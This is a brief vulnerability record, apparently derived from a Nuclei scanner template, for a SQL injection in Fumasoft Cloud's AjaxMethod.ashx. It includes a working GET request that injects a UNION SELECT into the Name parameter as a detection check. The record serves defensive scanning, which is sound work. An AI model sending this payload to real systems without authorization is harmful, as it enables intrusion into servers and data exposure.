# Vulnerability: Fumasoft Cloud - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`fumasoft-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the AjaxMethod.ashx file of Fumasoft Cloud. Attackers can obtain server permissions through the vulnerability

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{num}}')),3,32)--
```

